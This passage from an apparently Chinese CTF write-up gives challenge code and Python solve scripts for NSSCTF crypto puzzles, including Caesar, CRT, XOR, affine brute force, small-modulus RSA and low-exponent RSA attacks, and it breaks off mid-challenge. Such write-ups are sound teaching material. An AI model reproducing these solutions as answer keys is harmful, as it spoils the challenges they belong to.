id="baBAbaseSEse"><a href="#baBAbaseSEse" class="headerlink" title="baBAbaseSEse"></a>baBAbaseSEse</h2><p>base套娃，basecrcak一把梭。</p><p><img src="/posts/9d7b/image-20221030103002488.png" alt="image"></p><h2 id="A-dictator"><a href="#A-dictator" class="headerlink" title="A dictator"></a>A dictator</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="comment"># print(offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经典凯撒，枚举即可。</p><h2 id="littleprince"><a href="#littleprince" class="headerlink" title="littleprince"></a>littleprince</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a&gt;&gt;b|(a&amp;((<span class="number">1</span>&lt;&lt;b)-<span class="number">1</span>))&lt;&lt;(c-b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x,h</span>):</span><br><span class="line">    p=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    q=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    c1,c2=x%p,x%q</span><br><span class="line">    <span class="built_in">print</span>(p,q,c1,c2)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">m_len=m.bit_length()</span><br><span class="line">d,h,st=<span class="number">32</span>,<span class="number">16</span>,<span class="number">32</span></span><br><span class="line">r=m_len%d</span><br><span class="line"><span class="keyword">assert</span>(r&gt;h)</span><br><span class="line"><span class="keyword">while</span> st&lt;=m_len:</span><br><span class="line">    x=enc(m,st,m_len)</span><br><span class="line">    x&gt;&gt;=(m_len-d)</span><br><span class="line">    outp(x,h)</span><br><span class="line">    st+=d</span><br><span class="line">m&gt;&gt;=(m_len-r)</span><br><span class="line">outp(m,h)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">58831 56263 46164 34042</span><br><span class="line">55579 48157 2944 35950</span><br><span class="line">35507 38933 1938 2559</span><br><span class="line">63419 51803 24116 33843</span><br><span class="line">40423 47237 20923 43307</span><br><span class="line">33599 43441 4324 37076</span><br><span class="line">43541 40771 42833 32799</span><br><span class="line">54869 40031 21847 16617</span><br><span class="line">48953 34841 36031 3788</span><br><span class="line">34403 58271 12464 55665</span><br><span class="line">33457 61463 3512 47396</span><br><span class="line">53047 57283 185 38171</span><br><span class="line">52583 59281 45851 38603</span><br><span class="line">60727 58043 36261 37164</span><br></pre></td></tr></table></figure><p>给了hint</p><p>hint:When we generate two numbers, there may be a coincidence that they are coprime.</p><p>求一下公约数,没有。中国剩余定理求一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">cipher, n</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i <span class="keyword">for</span> i <span class="keyword">in</span> n))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    data = <span class="built_in">zip</span>(cipher, n)</span><br><span class="line">    <span class="keyword">for</span> ci, ni <span class="keyword">in</span> data:</span><br><span class="line">        Ni = N // ni</span><br><span class="line">        di = gmpy2.invert(Ni, ni)</span><br><span class="line">        result += ci * Ni * di</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">flag_bin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> data:</span><br><span class="line">    c_list = []</span><br><span class="line">    n_list = []</span><br><span class="line">    tmp = t.strip(<span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">2</span>]))</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">3</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">0</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    x, N = CRT(c_list, n_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(x),long_to_bytes(<span class="built_in">int</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(x) &lt;<span class="number">618357700</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x) + <span class="built_in">int</span>(tmp[<span class="number">0</span>])*<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="XXXOOORRR"><a href="#XXXOOORRR" class="headerlink" title="XXXOOORRR"></a>XXXOOORRR</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">randBytes = [bytes_to_long(os.urandom(<span class="number">64</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;randBytes[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;m ^ randBytes[<span class="number">0</span>] ^ randBytes[<span class="number">1</span>] ^ randBytes[<span class="number">2</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = 1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line"><span class="string">b = 10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line"><span class="string">c = 6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line"><span class="string">d = 5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>一道异或题，d^c^a就是flag。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">1215421974111272707828609697064234072332368362928440865251897449605952163161176359366553487776268706107760670434157083936287598207881176904763353849369234</span></span><br><span class="line">b = <span class="number">10533604054267448009117468094542127075826310122733511023911022436253583775790861879410728001403728088545946257902341417532648419689212361977221573357292618</span></span><br><span class="line">c = <span class="number">6401236597601556248960570084212025183497657335932789785351897915858852832577623776212842429736547820800219382515052263929074210010546149322465536545021479</span></span><br><span class="line">d = <span class="number">5711309307698496426409561761492698639489294806611133698231840146911562848869711567477706456972659368849642409039245400981517493100724067475248620536111560</span></span><br><span class="line">m = d^c^a</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>n可以直接用factor分解出p，q,然后一把梭就行。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">p=<span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q=<span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="爱妃"><a href="#爱妃" class="headerlink" title="爱妃"></a>爱妃</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,a,b,m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([(i*a+b)%m <span class="keyword">for</span> i <span class="keyword">in</span> message])</span><br><span class="line"></span><br><span class="line">a,b = getrandbits(<span class="number">4</span>),getrandbits(<span class="number">8</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;encrypt(flag,a,b,<span class="number">1</span>&lt;&lt;<span class="number">8</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>竟然已经知道明文的形式是NSSCTF{或者nssctf{，先爆破a,b，getrandbits(n)是获得一个在0-2^n之间的随机数，直接做字典爆破。a，b出来后爆破flag即可。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line">  </span><br><span class="line">ls1 = []</span><br><span class="line">ls2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">ls1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">ls2.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;NSSCTF&#123;&quot;</span></span><br><span class="line">cipher = <span class="string">b&#x27;y\xba\xba\xea\xc7\x11\xc2\xc7\xcb\xd8ZV\xd8ZVp\xb1\xb1\xd8\x19\xa4V\xa4\x19\x8aM\xa83g\xd8&amp;\x19\xdc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ls1: <span class="comment">#爆破a和b</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> ls2:</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            <span class="keyword">if</span> (a*flag[i] + b) % <span class="number">0x100</span> == cipher[i]:</span><br><span class="line">                s += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">7</span>:</span><br><span class="line">            <span class="built_in">print</span>(a,b)</span><br><span class="line">            <span class="comment">#13 131</span></span><br><span class="line">a,b = <span class="number">13</span>,<span class="number">131</span></span><br><span class="line">table = string.printable.encode() <span class="comment">#取ascii表</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table: <span class="comment">#爆破flag</span></span><br><span class="line">        <span class="keyword">if</span> (a*i + b)%<span class="number">0x100</span> == c:</span><br><span class="line">            res += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(res)   </span><br></pre></td></tr></table></figure><h2 id="RSA-again"><a href="#RSA-again" class="headerlink" title="RSA again"></a>RSA again</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">s = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n1 = p*q</span><br><span class="line">n2 = r*s</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x3</span></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e1 = <span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e2 = <span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line"><span class="string">n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033</span></span><br><span class="line"><span class="string">e1 = 3</span></span><br><span class="line"><span class="string">e2 = 65537</span></span><br><span class="line"><span class="string">c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"><span class="string">c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意的是e1&#x3D;3很小，低加密指数攻击。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">n= <span class="number">19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333</span></span><br><span class="line">e= <span class="number">3</span></span><br><span class="line">c= <span class="number">1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125</span></span><br><span class="line"></span><br><span class="line">m=de(c,e,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h2 id="strange-RSA"><a href="#strange-RSA" class="headerlink" title="strange RSA"></a>strange RSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*p*q*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line"><span class="string">c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span 